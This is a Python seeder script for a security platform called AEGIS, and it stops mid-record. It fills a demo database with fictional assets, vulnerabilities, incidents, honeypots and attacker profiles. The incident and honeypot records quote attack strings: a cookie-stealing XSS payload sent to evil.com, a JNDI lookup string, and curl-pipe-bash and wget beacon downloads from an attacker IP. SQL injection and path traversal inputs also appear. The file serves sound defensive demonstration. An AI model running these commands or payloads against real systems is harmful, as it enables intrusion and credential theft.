#!/usr/bin/env python3
"""
AEGIS Database Seeder
Populates the SQLite database with realistic cybersecurity demo data.

Usage:
    cd /path/to/aegis
    python scripts/seed.py
"""
import sys
import os
import uuid
import asyncio
from datetime import datetime, timedelta
import random

# Add backend to path so we can import models
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "backend"))
os.chdir(os.path.join(os.path.dirname(__file__), "..", "backend"))

from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine
from app.models.base import Base
from app.models.client import Client
from app.models.asset import Asset
from app.models.vulnerability import Vulnerability
from app.models.incident import Incident
from app.models.action import Action
from app.models.honeypot import Honeypot, HoneypotInteraction
from app.models.threat_intel import ThreatIntel
from app.models.audit_log import AuditLog
from app.models.attacker_profile import AttackerProfile


def uid() -> str:
    return str(uuid.uuid4())


def past(days: int) -> datetime:
    return datetime.utcnow() - timedelta(days=days, hours=random.randint(0, 23), minutes=random.randint(0, 59))


async def seed():
    engine = create_async_engine("sqlite+aiosqlite:///./aegis.db", echo=False)

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    session_factory = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

    async with session_factory() as session:
        # Check if data already exists
        from sqlalchemy import select, func
        result = await session.execute(select(func.count()).select_from(Client))
        if result.scalar() > 0:
            print("[SEED] Database already has data. Drop aegis.db and re-run to reseed.")
            return

        print("[SEED] Seeding AEGIS database with demo data...")

        # =============================================
        # 1. CLIENT
        # =============================================
        client_id = uid()
        client = Client(
            id=client_id,
            name="Demo Corp",
            slug="demo",
            api_key=generate_api_key(),
            settings={
                "scan_interval_hours": 24,
                "auto_remediation": False,
                "notification_channels": ["webhook", "email"],
                "risk_threshold": 7.0,
            },
            guardrails={
                "require_approval_above": "high",
                "auto_block_ips": True,
                "auto_isolate_hosts": False,
                "max_auto_actions_per_hour": 10,
            },
        )
        session.add(client)
        print("  [+] Client: Demo Corp")

        # =============================================
        # 2. ASSETS (15)
        # =============================================
        assets_data = [
            {"hostname": "api.democorp.com", "ip": "203.0.113.10", "type": "api", "ports": [443, 8080], "tech": ["nginx/1.24", "Node.js/20.11", "Express/4.18"], "risk": 7.2},
            {"hostname": "web.democorp.com", "ip": "203.0.113.11", "type": "web", "ports": [80, 443], "tech": ["Apache/2.4.58", "PHP/8.2", "WordPress/6.4"], "risk": 8.1},
            {"hostname": "db-prod-01.internal", "ip": "10.10.1.50", "type": "server", "ports": [5432, 22], "tech": ["PostgreSQL/16.1", "Ubuntu 22.04"], "risk": 6.5},
            {"hostname": "db-prod-02.internal", "ip": "10.10.1.51", "type": "server", "ports": [3306, 22], "tech": ["MySQL/8.0.36", "Ubuntu 22.04"], "risk": 5.8},
            {"hostname": "mail.democorp.com", "ip": "203.0.113.15", "type": "server", "ports": [25, 587, 993], "tech": ["Postfix/3.8", "Dovecot/2.3"], "risk": 6.9},
            {"hostname": "cdn-assets.democorp.com", "ip": "203.0.113.20", "type": "cloud", "ports": [443], "tech": ["CloudFront", "S3"], "risk": 3.2},
            {"hostname": "auth.democorp.com", "ip": "203.0.113.12", "type": "api", "ports": [443], "tech": ["nginx/1.24", "Python/3.11", "FastAPI/0.109"], "risk": 9.1},
            {"hostname": "admin.democorp.com", "ip": "203.0.113.13", "type": "web", "ports": [443], "tech": ["React/18.2", "nginx/1.24"], "risk": 7.8},
            {"hostname": "vpn.democorp.com", "ip": "203.0.113.25", "type": "server", "ports": [1194, 443], "tech": ["OpenVPN/2.6.8"], "risk": 5.5},
            {"hostname": "jenkins.internal", "ip": "10.10.2.10", "type": "server", "ports": [8080, 22], "tech": ["Jenkins/2.442", "Java/17", "Ubuntu 22.04"], "risk": 8.4},
            {"hostname": "k8s-master.internal", "ip": "10.10.3.1", "type": "cloud", "ports": [6443, 10250], "tech": ["Kubernetes/1.29", "containerd/1.7"], "risk": 7.0},
            {"hostname": "grafana.internal", "ip": "10.10.2.20", "type": "web", "ports": [3000, 22], "tech": ["Grafana/10.3", "Ubuntu 22.04"], "risk": 4.5},
            {"hostname": "storage.democorp.com", "ip": "203.0.113.30", "type": "cloud", "ports": [443, 9000], "tech": ["MinIO/2024.01", "TLS 1.3"], "risk": 5.2},
            {"hostname": "legacy-erp.internal", "ip": "10.10.1.100", "type": "web", "ports": [8443, 22], "tech": ["Tomcat/9.0.84", "Java/11", "CentOS 7"], "risk": 9.3},
            {"hostname": "mqtt-broker.internal", "ip": "10.10.4.5", "type": "server", "ports": [1883, 8883], "tech": ["Mosquitto/2.0.18", "Debian 12"], "risk": 6.1},
        ]

        asset_ids = []
        for a in assets_data:
            aid = uid()
            asset_ids.append(aid)
            session.add(Asset(
                id=aid,
                client_id=client_id,
                hostname=a["hostname"],
                ip_address=a["ip"],
                asset_type=a["type"],
                ports=a["ports"],
                technologies=a["tech"],
                status="active",
                risk_score=a["risk"],
                last_scan_at=past(random.randint(1, 7)),
                metadata_={},
            ))
        print(f"  [+] Assets: {len(assets_data)}")

        # =============================================
        # 3. VULNERABILITIES (25)
        # =============================================
        vulns_data = [
            # Critical
            {"asset": 1, "title": "WordPress Remote Code Execution via REST API", "cve": "CVE-2024-31210", "cvss": 9.8, "severity": "critical", "template": "CVE-2024-31210", "status": "open",
             "desc": "Unauthenticated RCE via crafted REST API request to wp-json endpoint. Attacker can execute arbitrary PHP code on the server.",
             "remediation": "Update WordPress to version 6.4.4 or later. Restrict REST API access with WAF rules."},
            {"asset": 6, "title": "Authentication Bypass in FastAPI OAuth2 Flow", "cve": "CVE-2025-0306", "cvss": 9.6, "severity": "critical", "template": "CVE-2025-0306", "status": "open",
             "desc": "JWT validation bypass allows attackers to forge authentication tokens. The /token endpoint accepts tampered JWTs with algorithm confusion.",
             "remediation": "Pin JWT algorithm to RS256 in config. Update python-jose to 3.4.0+. Rotate all existing tokens."},
            {"asset": 13, "title": "Apache Tomcat Request Smuggling", "cve": "CVE-2024-52317", "cvss": 9.1, "severity": "critical", "template": "CVE-2024-52317", "status": "open",
             "desc": "HTTP request smuggling via malformed Transfer-Encoding headers allows authentication bypass and cache poisoning.",
             "remediation": "Upgrade Tomcat to 9.0.86+. Configure reverse proxy to normalize Transfer-Encoding headers."},
            # High
            {"asset": 0, "title": "Server-Side Request Forgery in API Gateway", "cve": "CVE-2024-28849", "cvss": 8.6, "severity": "high", "template": "CVE-2024-28849", "status": "open",
             "desc": "SSRF via URL parameter in /api/proxy endpoint. Internal services accessible including metadata endpoint at 169.254.169.254.",
             "remediation": "Implement URL allowlist validation. Block requests to private IP ranges and cloud metadata endpoints."},
            {"asset": 9, "title": "Jenkins Script Console Accessible Without Auth", "cve": "CVE-2024-43044", "cvss": 8.8, "severity": "high", "template": "CVE-2024-43044", "status": "open",
             "desc": "Jenkins Groovy script console exposed without authentication due to misconfigured authorization strategy. Allows arbitrary command execution.",
             "remediation": "Enable Matrix-based security. Restrict script console access to admin users. Enable CSRF protection."},
            {"asset": 2, "title": "PostgreSQL Privilege Escalation via pg_read_server_files", "cve": "CVE-2024-7348", "cvss": 8.0, "severity": "high", "template": "CVE-2024-7348", "status": "open",
             "desc": "Low-privileged database user can read arbitrary files on the server using pg_read_server_files role inherited via public schema.",
             "remediation": "Revoke pg_read_server_files from public role. Upgrade PostgreSQL to 16.2+. Audit role memberships."},
            {"asset": 7, "title": "React Admin Panel Stored XSS via User Profile", "cve": "CVE-2024-39338", "cvss": 7.5, "severity": "high", "template": "CVE-2024-39338", "status": "remediated",
             "desc": "Stored XSS in admin user profile display name field. Malicious JavaScript executes in context of admin users viewing the user list.",
             "remediation": "Sanitize user input with DOMPurify. Implement Content-Security-Policy headers."},
            {"asset": 10, "title": "Kubernetes API Server Authorization Bypass", "cve": "CVE-2024-3177", "cvss": 8.1, "severity": "high", "template": "CVE-2024-3177", "status": "open",
             "desc": "RBAC bypass allows pod creation in restricted namespaces via malformed serviceAccountName in pod spec.",
             "remediation": "Upgrade to Kubernetes 1.29.3+. Enable PodSecurity admission. Audit namespace policies."},
            {"asset": 4, "title": "Postfix SMTP Relay Open to Authenticated Users", "cve": None, "cvss": 7.2, "severity": "high", "template": "smtp-open-relay", "status": "open",
             "desc": "SMTP relay permits authenticated users to send mail as any domain. Exploitable for phishing campaigns from trusted infrastructure.",
             "remediation": "Restrict sender addresses in Postfix main.cf using smtpd_sender_restrictions. Enable SPF/DKIM validation."},
            # Medium
            {"asset": 0, "title": "Express.js Information Disclosure via Error Stack", "cve": None, "cvss": 5.3, "severity": "medium", "template": "express-stack-trace", "status": "open",
             "desc": "Unhandled exceptions return full stack traces including file paths, dependency versions, and environment variables in API responses.",
             "remediation": "Set NODE_ENV=production. Implement global error handler that returns generic error messages."},
            {"asset": 1, "title": "WordPress XML-RPC Brute Force Amplification", "cve": None, "cvss": 5.9, "severity": "medium", "template": "wordpress-xmlrpc-bruteforce", "status": "open",
             "desc": "XML-RPC system.multicall allows testing hundreds of passwords in a single HTTP request, bypassing rate limiting.",
             "remediation": "Disable XML-RPC via .htaccess or plugin. Implement application-level rate limiting on authentication."},
            {"asset": 3, "title": "MySQL Default Credentials on Internal Instance", "cve": None, "cvss": 6.5, "severity": "medium", "template": "mysql-default-creds", "status": "remediated",
             "desc": "MySQL instance accessible with default root credentials (root/root). Database contains application configuration data.",
             "remediation": "Change root password. Create application-specific user with least privileges. Bind to localhost only."},
            {"asset": 5, "title": "S3 Bucket Listing Enabled on CDN Assets", "cve": None, "cvss": 5.0, "severity": "medium", "template": "s3-bucket-listing", "status": "open",
             "desc": "S3 bucket used for CDN assets allows directory listing. Internal file structure and naming conventions exposed.",
             "remediation": "Disable bucket listing in S3 bucket policy. Use CloudFront origin access identity for access control."},
            {"asset": 8, "title": "OpenVPN Weak Cipher Suite Negotiation", "cve": None, "cvss": 5.6, "severity": "medium", "template": "openvpn-weak-cipher", "status": "open",
             "desc": "OpenVPN server accepts BF-CBC cipher and TLS 1.0 connections. Vulnerable to SWEET32 birthday attack on long-lived sessions.",
             "remediation": "Configure cipher AES-256-GCM in server.conf. Set tls-version-min 1.2. Remove BF-CBC from allowed ciphers."},
            {"asset": 11, "title": "Grafana Anonymous Access Enabled", "cve": None, "cvss": 4.3, "severity": "medium", "template": "grafana-anon-access", "status": "open",
             "desc": "Grafana instance allows anonymous access with Viewer role. Internal metrics, infrastructure topology, and alerting rules exposed.",
             "remediation": "Disable anonymous access in grafana.ini. Require authentication with org-level permissions."},
            {"asset": 14, "title": "MQTT Broker Allows Anonymous Connections", "cve": None, "cvss": 6.1, "severity": "medium", "template": "mqtt-anon-access", "status": "open",
             "desc": "Mosquitto MQTT broker accepts connections without authentication. IoT sensor data and control commands accessible to any network user.",
             "remediation": "Enable password_file in mosquitto.conf. Require TLS client certificates for IoT devices."},
            {"asset": 12, "title": "MinIO Information Disclosure via Health Endpoint", "cve": "CVE-2024-36107", "cvss": 5.3, "severity": "medium", "template": "CVE-2024-36107", "status": "open",
             "desc": "MinIO health check endpoint exposes server version, uptime, and storage configuration without authentication.",
             "remediation": "Update MinIO to latest version. Restrict /minio/health/* endpoints to internal network only."},
            # Low
            {"asset": 0, "title": "Missing HTTP Security Headers on API", "cve": None, "cvss": 3.1, "severity": "low", "template": "missing-security-headers", "status": "open",
             "desc": "API responses missing X-Content-Type-Options, X-Frame-Options, and Strict-Transport-Security headers.",
             "remediation": "Add security headers via middleware: HSTS, X-Content-Type-Options: nosniff, X-Frame-Options: DENY."},
            {"asset": 1, "title": "WordPress Version Disclosure", "cve": None, "cvss": 2.6, "severity": "low", "template": "wordpress-version", "status": "open",
             "desc": "WordPress version 6.4.2 disclosed in HTML meta generator tag and RSS feed.",
             "remediation": "Remove version from generator tag via functions.php filter. Disable RSS feed if not needed."},
            {"asset": 2, "title": "PostgreSQL Verbose Error Messages Enabled", "cve": None, "cvss": 3.0, "severity": "low", "template": "postgres-verbose-errors", "status": "open",
             "desc": "PostgreSQL log_min_error_statement set to DEBUG. Query syntax and table structure leak through error messages.",
             "remediation": "Set log_min_error_statement to ERROR in postgresql.conf. Ensure client_min_messages is set to WARNING."},
            # Info
            {"asset": 7, "title": "CSP Header Not Configured on Admin Panel", "cve": None, "cvss": 0.0, "severity": "info", "template": "missing-csp", "status": "open",
             "desc": "Content-Security-Policy header not present. While no active vulnerability, this reduces defense-in-depth against XSS.",
             "remediation": "Implement CSP with script-src 'self'; style-src 'self' 'unsafe-inline'; default-src 'self'."},
            {"asset": 10, "title": "Kubernetes Dashboard Exposed on Internal Network", "cve": None, "cvss": 0.0, "severity": "info", "template": "k8s-dashboard-exposed", "status": "open",
             "desc": "Kubernetes Dashboard accessible on internal network without additional network segmentation.",
             "remediation": "Consider restricting dashboard access via NetworkPolicy or VPN-only access."},
            {"asset": 6, "title": "TLS Certificate Expiring in 30 Days", "cve": None, "cvss": 0.0, "severity": "info", "template": "tls-cert-expiry", "status": "open",
             "desc": "TLS certificate for auth.democorp.com expires on 2026-04-17. Auto-renewal should be verified.",
             "remediation": "Verify certbot auto-renewal cron is active. Test with: certbot renew --dry-run."},
            {"asset": 9, "title": "Jenkins Outdated Plugin: Git Plugin 5.0.0", "cve": None, "cvss": 0.0, "severity": "info", "template": "jenkins-outdated-plugin", "status": "open",
             "desc": "Jenkins Git Plugin version 5.0.0 has known issues. Version 5.2.1 available with security improvements.",
             "remediation": "Update via Jenkins Plugin Manager. Schedule maintenance window for plugin updates."},
            {"asset": 13, "title": "Legacy ERP Running End-of-Life CentOS 7", "cve": None, "cvss": 0.0, "severity": "info", "template": "eol-os", "status": "open",
             "desc": "CentOS 7 reached end-of-life June 2024. No further security patches available from upstream.",
             "remediation": "Plan migration to RHEL 9 or Ubuntu 22.04 LTS. Apply Extended Lifecycle Support if migration delayed."},
        ]

        vuln_ids = []
        for v in vulns_data:
            vid = uid()
            vuln_ids.append(vid)
            session.add(Vulnerability(
                id=vid,
                client_id=client_id,
                asset_id=asset_ids[v["asset"]],
                title=v["title"],
                description=v["desc"],
                severity=v["severity"],
                cvss_score=v["cvss"],
                cve_id=v["cve"],
                template_id=v["template"],
                evidence=f"Detected by Nuclei scan using template {v['template']}",
                status=v["status"],
                ai_risk_score=v["cvss"] * 1.1 if v["cvss"] > 7 else v["cvss"] * 0.9,
                ai_analysis=f"AI assessed contextual risk considering asset exposure and business criticality.",
                remediation=v["remediation"],
                found_at=past(random.randint(3, 30)),
                remediated_at=past(1) if v["status"] == "remediated" else None,
            ))
        print(f"  [+] Vulnerabilities: {len(vulns_data)}")

        # =============================================
        # 4. INCIDENTS (10)
        # =============================================
        incidents_data = [
            {"title": "SSH Brute Force Attack on Production Database", "severity": "high", "status": "contained",
             "source": "wazuh", "technique": "T1110.001", "tactic": "Credential Access",
             "src_ip": "185.220.101.34", "asset": 2,
             "desc": "Wazuh detected 847 failed SSH login attempts from 185.220.101.34 targeting db-prod-01 over 15 minutes. Source IP is known Tor exit node. Attempts used common username/password combinations.",
             "analysis": {"threat_level": "high", "is_targeted": False, "recommendation": "Block source IP, enforce key-based SSH auth"}},
            {"title": "SQL Injection Attempt on API Gateway", "severity": "critical", "status": "investigating",
             "source": "wazuh", "technique": "T1190", "tactic": "Initial Access",
             "src_ip": "45.155.205.108", "asset": 0,
             "desc": "WAF triggered on multiple SQL injection payloads targeting /api/v1/users?search= parameter. Payloads include UNION-based and time-based blind injection vectors. 23 unique payloads detected in 5 minutes.",
             "analysis": {"threat_level": "critical", "payload_type": "UNION + blind", "recommendation": "Parameterize query, add input validation, block IP"}},
            {"title": "Suspicious Data Exfiltration via DNS", "severity": "critical", "status": "open",
             "source": "manual", "technique": "T1048.003", "tactic": "Exfiltration",
             "src_ip": "10.10.1.50", "asset": 2,
             "desc": "Anomalous DNS query volume detected from db-prod-01. Over 5,000 TXT record lookups to unusual subdomain patterns of xf7k2.attacker-c2.xyz in the last hour. Pattern consistent with DNS tunneling for data exfiltration.",
             "analysis": {"threat_level": "critical", "exfil_volume_est": "~2.5MB encoded", "recommendation": "Isolate host immediately, forensic image, check for compromised credentials"}},
            {"title": "WordPress Admin Login from Unusual Location", "severity": "medium", "status": "resolved",
             "source": "wazuh", "technique": "T1078", "tactic": "Initial Access",
             "src_ip": "91.134.174.202", "asset": 1,
             "desc": "Successful WordPress admin login from IP 91.134.174.202 (France). Normal admin access is from US IPs only. Login occurred at 03:47 UTC outside business hours.",
             "analysis": {"threat_level": "medium", "geo_anomaly": True, "recommendation": "Verify with account owner, consider credential rotation"}},
            {"title": "Kubernetes Pod Deployed with Privileged Container", "severity": "high", "status": "contained",
             "source": "manual", "technique": "T1610", "tactic": "Execution",
             "src_ip": None, "asset": 10,
             "desc": "New pod 'debug-shell-x7f2' deployed in production namespace with privileged:true and hostPID:true. Pod runs image from public Docker Hub (alpine:latest). No matching CI/CD pipeline run found.",
             "analysis": {"threat_level": "high", "likely_insider": True, "recommendation": "Delete pod, audit kubectl access logs, review RBAC policies"}},
            {"title": "XSS Payload Stored in User Profile Field", "severity": "medium", "status": "resolved",
             "source": "surface_scan", "technique": "T1059.007", "tactic": "Execution",
             "src_ip": "198.51.100.44", "asset": 7,
             "desc": "Stored XSS payload found in admin panel user display name: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>. Payload would execute for any admin viewing the user list.",
             "analysis": {"threat_level": "medium", "impact": "session hijacking", "recommendation": "Sanitize input, deploy CSP, rotate admin sessions"}},
            {"title": "Unauthorized Access to Jenkins Script Console", "severity": "critical", "status": "investigating",
             "source": "honeypot", "technique": "T1059.004", "tactic": "Execution",
             "src_ip": "103.75.201.18", "asset": 9,
             "desc": "Jenkins script console accessed from external IP. Groovy script executed: 'whoami'.execute().text and attempted to download reverse shell from https://103.75.201.18/shell.sh.",
             "analysis": {"threat_level": "critical", "post_exploitation": True, "recommendation": "Isolate Jenkins, rotate all credentials, check for persistence mechanisms"}},
            {"title": "MQTT Broker Unauthorized Subscribe to Control Topic", "severity": "medium", "status": "open",
             "source": "manual", "technique": "T1557", "tactic": "Collection",
             "src_ip": "10.10.4.200", "asset": 14,
             "desc": "Unknown internal client subscribed to /devices/+/control topic on MQTT broker. This topic carries actuator commands for IoT devices. Source IP not in authorized device list.",
             "analysis": {"threat_level": "medium", "iot_risk": True, "recommendation": "Enable MQTT ACLs, require client certificates, investigate source IP"}},
            {"title": "Credential Stuffing Attack on Auth Service", "severity": "high", "status": "contained",
             "source": "wazuh", "technique": "T1110.004", "tactic": "Credential Access",
             "src_ip": "193.32.162.89", "asset": 6,
             "desc": "5,200 login attempts against auth.democorp.com from distributed IPs in 30 minutes. Using known credential dumps. 12 successful logins detected with compromised passwords.",
             "analysis": {"threat_level": "high", "successful_logins": 12, "recommendation": "Force password reset for compromised accounts, enable MFA, block source IP ranges"}},
            {"title": "Anomalous Outbound Traffic from Legacy ERP", "severity": "high", "status": "open",
             "source": "manual", "technique": "T1071.001", "tactic": "Command and Control",
             "src_ip": "10.10.1.100", "asset": 13,
             "desc": "Legacy ERP server initiating HTTPS connections to 5 external IPs not in any known legitimate service list. Traffic pattern shows beaconing every 300 seconds with small payload sizes typical of C2 communication.",
             "analysis": {"threat_level": "high", "c2_indicators": True, "beacon_interval": "300s", "recommendation": "Isolate host, capture traffic for analysis, check for malware"}},
        ]

        incident_ids = []
        for i, inc in enumerate(incidents_data):
            iid = uid()
            incident_ids.append(iid)
            detected = past(random.randint(1, 14))
            session.add(Incident(
                id=iid,
                client_id=client_id,
                title=inc["title"],
                description=inc["desc"],
                severity=inc["severity"],
                status=inc["status"],
                source=inc["source"],
                mitre_technique=inc["technique"],
                mitre_tactic=inc["tactic"],
                source_ip=inc["src_ip"],
                target_asset_id=asset_ids[inc["asset"]],
                ai_analysis=inc["analysis"],
                raw_alert={"source": inc["source"], "raw": f"Alert data for incident {i+1}"},
                detected_at=detected,
                contained_at=detected + timedelta(hours=random.randint(1, 4)) if inc["status"] in ("contained", "resolved") else None,
                resolved_at=detected + timedelta(hours=random.randint(4, 24)) if inc["status"] == "resolved" else None,
            ))
        print(f"  [+] Incidents: {len(incidents_data)}")

        # =============================================
        # 5. RESPONSE ACTIONS (5)
        # =============================================
        actions_data = [
            {"incident": 0, "type": "block_ip", "target": "185.220.101.34",
             "params": {"firewall": "iptables", "rule": "INPUT DROP", "duration_hours": 72},
             "status": "executed", "approval": False,
             "reasoning": "Automated response: Source IP 185.220.101.34 identified as Tor exit node with 847 failed SSH attempts. Risk score exceeds auto-block threshold.",
             "result": {"blocked": True, "rule_id": "fw-2026-0341"}},
            {"incident": 1, "type": "block_ip", "target": "45.155.205.108",
             "params": {"firewall": "cloudflare", "rule": "WAF block", "duration_hours": 168},
             "status": "executed", "approval": False,
             "reasoning": "SQL injection source blocked at WAF level. 23 unique injection payloads indicate automated attack tool.",
             "result": {"blocked": True, "cf_rule_id": "waf-sql-0108"}},
            {"incident": 2, "type": "isolate_host", "target": "db-prod-01.internal (10.10.1.50)",
             "params": {"method": "network_acl", "allow_forensic_access": True},
             "status": "pending", "approval": True,
             "reasoning": "DNS exfiltration detected from database server. Host isolation required but needs manual approval due to production impact. Guardrail: isolate_host requires approval.",
             "result": None},
            {"incident": 8, "type": "revoke_credentials", "target": "12 compromised user accounts",
             "params": {"method": "force_password_reset", "invalidate_sessions": True, "enforce_mfa": True},
             "status": "executed", "approval": True,
             "reasoning": "12 accounts compromised via credential stuffing. Immediate credential rotation with mandatory MFA enrollment.",
             "result": {"accounts_reset": 12, "sessions_invalidated": 34, "mfa_enforced": True}},
            {"incident": 6, "type": "isolate_host", "target": "jenkins.internal (10.10.2.10)",
             "params": {"method": "vlan_quarantine", "allow_forensic_access": True},
             "status": "approved", "approval": True,
             "reasoning": "Jenkins compromise confirmed via script console. Reverse shell download attempted. Immediate isolation required to prevent lateral movement.",
             "result": None},
        ]

        for act in actions_data:
            session.add(Action(
                id=uid(),
                incident_id=incident_ids[act["incident"]],
                client_id=client_id,
                action_type=act["type"],
                target=act["target"],
                parameters=act["params"],
                status=act["status"],
                requires_approval=act["approval"],
                approved_by="admin@democorp.com" if act["status"] in ("executed", "approved") and act["approval"] else None,
                ai_reasoning=act["reasoning"],
                result=act["result"],
                executed_at=past(random.randint(1, 5)) if act["status"] == "executed" else None,
            ))
        print(f"  [+] Response Actions: {len(actions_data)}")

        # =============================================
        # 6. HONEYPOTS (5)
        # =============================================
        honeypots_data = [
            {"name": "ssh-trap-01", "type": "ssh", "ip": "10.10.99.10", "port": 22, "status": "running",
             "config": {"banner": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4", "fake_users": ["admin", "root", "deploy", "ubuntu"], "capture_commands": True}},
            {"name": "http-decoy-01", "type": "http", "ip": "10.10.99.11", "port": 8080, "status": "running",
             "config": {"server_header": "Apache/2.4.52", "fake_paths": ["/admin", "/wp-admin", "/phpmyadmin", "/.env", "/api/config"], "capture_payloads": True}},
            {"name": "smb-trap-01", "type": "smb", "ip": "10.10.99.12", "port": 445, "status": "running",
             "config": {"hostname": "FILESERVER01", "shares": ["Documents$", "Backup", "IT-Tools"], "capture_hashes": True}},
            {"name": "api-decoy-01", "type": "api", "ip": "10.10.99.13", "port": 443, "status": "running",
             "config": {"endpoints": ["/api/v1/users", "/api/v1/admin", "/graphql", "/api/internal/config"], "fake_data": True, "capture_tokens": True}},
            {"name": "smtp-trap-01", "type": "smtp", "ip": "10.10.99.14", "port": 25, "status": "stopped",
             "config": {"banner": "220 mail.democorp.com ESMTP Postfix", "accept_all": True, "capture_attachments": True}},
        ]

        honeypot_ids = []
        for hp in honeypots_data:
            hid = uid()
            honeypot_ids.append(hid)
            session.add(Honeypot(
                id=hid,
                client_id=client_id,
                name=hp["name"],
                honeypot_type=hp["type"],
                config=hp["config"],
                status=hp["status"],
                ip_address=hp["ip"],
                port=hp["port"],
                last_rotation=past(random.randint(1, 10)),
                interactions_count=random.randint(5, 50),
            ))
        print(f"  [+] Honeypots: {len(honeypots_data)}")

        # =============================================
        # 7. ATTACKER PROFILES (5)
        # =============================================
        attackers_data = [
            {"ip": "185.220.101.34", "known_ips": ["185.220.101.34", "185.220.101.35", "185.220.101.36"],
             "tools": ["Hydra 9.5", "Medusa 2.2", "Custom SSH scanner"],
             "techniques": ["T1110.001", "T1110.003", "T1078.001"],
             "sophistication": "script_kiddie",
             "geo": {"country": "DE", "city": "Frankfurt", "asn": "AS205100", "org": "Tor Exit Node"},
             "assessment": "Low-sophistication automated scanner using Tor network. Uses common credential lists. No evidence of targeted reconnaissance. Likely part of large-scale botnet scanning campaign."},
            {"ip": "45.155.205.108", "known_ips": ["45.155.205.108", "45.155.205.109", "45.155.205.110"],
             "tools": ["sqlmap 1.8", "Custom HTTP fuzzer", "Burp Suite"],
             "techniques": ["T1190", "T1059.007", "T1005"],
             "sophistication": "intermediate",
             "geo": {"country": "RU", "city": "Moscow", "asn": "AS44477", "org": "Stark Industries Solutions"},
             "assessment": "Intermediate attacker with SQL injection expertise. Uses automated tools but also manual exploitation. Targets multiple web applications systematically. Likely part of organized cybercrime group."},
            {"ip": "103.75.201.18", "known_ips": ["103.75.201.18", "103.75.201.20"],
             "tools": ["Metasploit 6.3", "Cobalt Strike 4.9", "Custom PowerShell scripts", "Mimikatz"],
             "techniques": ["T1059.001", "T1059.004", "T1053.005", "T1021.001", "T1003.001"],
             "sophistication": "advanced",
             "geo": {"country": "CN", "city": "Hong Kong", "asn": "AS135377", "org": "UCLOUD"},
             "assessment": "Advanced persistent threat actor. Uses Cobalt Strike C2 infrastructure with custom malleable profiles. Evidence of living-off-the-land techniques. Post-exploitation activity suggests data collection objectives. Consistent with APT41 TTP patterns."},
            {"ip": "193.32.162.89", "known_ips": ["193.32.162.89", "193.32.162.90", "193.32.162.91", "193.32.162.92", "193.32.162.93"],
             "tools": ["SentryMBA", "OpenBullet", "Custom credential checker"],
             "techniques": ["T1110.004", "T1078.004", "T1589.001"],
             "sophistication": "intermediate",
             "geo": {"country": "NL", "city": "Amsterdam", "asn": "AS9009", "org": "M247 Europe"},
             "assessment": "Credential stuffing operator using distributed proxy infrastructure. Operates on purchased credential dumps from dark web markets. Uses residential proxies to evade IP-based blocking. Monetizes through account takeover and resale."},
            {"ip": "198.51.100.44", "known_ips": ["198.51.100.44"],
             "tools": ["Burp Suite Professional", "Custom XSS payloads", "BeEF Framework"],
             "techniques": ["T1059.007", "T1189", "T1557.002"],
             "sophistication": "intermediate",
             "geo": {"country": "US", "city": "Chicago", "asn": "AS13335", "org": "Cloudflare"},
             "assessment": "Web application specialist focused on XSS and client-side attacks. Sophisticated payload construction suggests manual operation. May be penetration tester or bug bounty hunter operating without authorization."},
        ]

        attacker_ids = []
        for atk in attackers_data:
            aid = uid()
            attacker_ids.append(aid)
            session.add(AttackerProfile(
                id=aid,
                client_id=client_id,
                source_ip=atk["ip"],
                known_ips=atk["known_ips"],
                tools_used=atk["tools"],
                techniques=atk["techniques"],
                sophistication=atk["sophistication"],
                geo_data=atk["geo"],
                first_seen=past(random.randint(14, 60)),
                last_seen=past(random.randint(0, 7)),
                total_interactions=random.randint(3, 45),
                ai_assessment=atk["assessment"],
            ))
        print(f"  [+] Attacker Profiles: {len(attackers_data)}")

        # =============================================
        # 8. HONEYPOT INTERACTIONS (20)
        # =============================================
        interactions_data = [
            # SSH honeypot interactions
            {"hp": 0, "src_ip": "185.220.101.34", "port": 45678, "proto": "ssh", "duration": 12,
             "commands": ["whoami", "uname -a", "cat /etc/passwd", "id"],
             "creds": [{"user": "root", "pass": "admin123"}, {"user": "root", "pass": "toor"}, {"user": "admin", "pass": "password"}],
             "payloads": [], "attacker": 0},
            {"hp": 0, "src_ip": "185.220.101.35", "port": 51234, "proto": "ssh", "duration": 8,
             "commands": ["id", "w", "cat /etc/shadow"],
             "creds": [{"user": "ubuntu", "pass": "ubuntu"}, {"user": "deploy", "pass": "deploy123"}],
             "payloads": [], "attacker": 0},
            {"hp": 0, "src_ip": "103.75.201.18", "port": 49876, "proto": "ssh", "duration": 187,
             "commands": ["id", "uname -a", "cat /proc/cpuinfo", "curl http://103.75.201.18/implant.sh | bash", "wget http://103.75.201.18/beacon -O /tmp/.b", "chmod +x /tmp/.b", "nohup /tmp/.b &"],
             "creds": [{"user": "root", "pass": "P@ssw0rd2024"}],
             "payloads": ["curl http://103.75.201.18/implant.sh | bash"], "attacker": 2},
            {"hp": 0, "src_ip": "193.32.162.89", "port": 52345, "proto": "ssh", "duration": 3,
             "commands": [],
             "creds": [{"user": "admin", "pass": "letmein"}, {"user": "root", "pass": "root"}, {"user": "test", "pass": "test"}],
             "payloads": [], "attacker": 3},
            # HTTP honeypot interactions
            {"hp": 1, "src_ip": "45.155.205.108", "port": 55432, "proto": "http", "duration": 45,
             "commands": ["GET /wp-admin", "GET /.env", "GET /api/config", "POST /wp-login.php", "GET /phpmyadmin/setup.php"],
             "creds": [{"user": "admin", "pass": "admin"}, {"user": "root", "pass": "root"}],
             "payloads": ["' OR 1=1--", "'; DROP TABLE users;--", "<script>alert(1)</script>"], "attacker": 1},
            {"hp": 1, "src_ip": "45.155.205.109", "port": 55433, "proto": "http", "duration": 120,
             "commands": ["GET /robots.txt", "GET /.git/config", "GET /.env", "GET /api/v1/users", "GET /graphql?query={__schema{types{name}}}"],
             "creds": [],
             "payloads": ["{{7*7}}", "${jndi:ldap://evil.com/a}", "../../../../../../etc/passwd"], "attacker": 1},
            {"hp": 1, "src_ip": "103.75.201.18", "port": 44321, "proto": "http", "duration": 300,
             "commands": ["GET /", "GET /api/v1/admin", "POST /api/v1/auth/login", "GET /api/v1/users?page=1", "PUT /api/v1/users/1"],
             "creds": [{"user": "admin@democorp.com", "pass": "Str0ngP@ss!"}],
